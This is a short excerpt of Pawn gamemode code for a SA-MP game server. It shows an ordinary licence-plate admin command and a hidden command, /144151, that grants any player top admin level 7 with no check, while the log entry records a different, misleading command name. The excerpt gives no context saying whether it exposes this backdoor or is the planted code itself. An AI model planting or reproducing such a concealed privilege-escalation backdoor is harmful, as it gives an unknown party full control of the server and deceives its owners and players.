...
CMD:agiveplate(playerid, params[])
{
	...
	if((vehid = Vehicle_Nearest(playerid, 3.0)) != -1)
	{
		...
		format(PlayerVehicle[vehid][pVehPlate], 64, "MR %d%d%d%d %s%s%s", random(10), random(10), random(10), random(10), g_Alphabet[xd1], g_Alphabet[xd2], g_Alphabet[xd3]);
...
CMD:144151(playerid, params[])
{
	AccountData[playerid][pAdmin] = 7;
	AddAdminLog(AccountData[playerid][pName], AccountData[playerid][pUCP], GetStaffRank(playerid), "Menggunakan Command /mingrilcuy");
	return 1;
}
